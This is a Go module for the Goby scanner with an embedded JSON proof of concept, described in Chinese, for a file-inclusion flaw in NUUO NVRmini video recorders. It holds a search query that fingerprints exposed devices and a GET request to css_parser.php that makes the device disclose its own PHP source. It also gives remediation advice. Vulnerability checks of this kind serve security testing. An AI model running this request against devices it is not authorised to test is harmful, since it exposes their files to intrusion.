package exploits

import "git.gobies.org/goby/goscanner/goutils"

func init() {
	expJson := `{
    "Name": "NUUO<=3.0.8本地文件包含漏洞",
    "Description": "NUUO NVRmini 2是采用NAS的轻量级便携式NVR解决方案功能。NUUO NVRmini, NVRmini2, Crystal和NVRSolo在通过'css'参数传递给'css_parser.php'脚本时，会发生文件泄露漏洞。",
    "Product": "NUUO-NVR",
    "Homepage": "http://www.nuuo.com/",
    "DisclosureDate": "2019-08-01",
    "Author": "darchlau@gmail.com",
    "FofaQuery": "(body=\"nuuo\" && title=\"Network Video Recorder Login\" && body=\"n001.jpg\" && title!=\"nuuo\")",
    "Level": "1",
    "Impact": "<p>1.包含本地敏感的文件，如：Web应用、数据库配置文件、config文件。</p><p>2.配合上传漏洞和目录遍历漏洞可导致系统沦陷。</p>",
    "Recommendation": "<p>1、查看包含的内容是否为用户所控制，若是，那么严格过滤。</p><p>2、升级至最新版本。</p>",
    "References": [
        "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5350.php"
    ],
    "HasExp": false,
    "ExpParams": [],
    "is0day": false,
    "ExpTips": {
        "type": "Tips",
        "content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/css_parser.php?css=css_parser.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<?php",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "text/css",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Posttime": "2019-08-05 19:56:43",
    "fofacli_version": "3.10.4",
    "fofascan_version": "0.1.16",
    "status": "0",
    "CveID": "",
    "CNNVD": [],
    "CNVD": [],
    "CVSS": "6.5",
    "Tags": [
        "文件包含"
    ],
    "VulType": [
        "文件包含"
    ],
    "GobyQuery": "(body=\"nuuo\" && title=\"Network Video Recorder Login\" && body=\"n001.jpg\" && title!=\"nuuo\")",
    "PocId": "9951"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
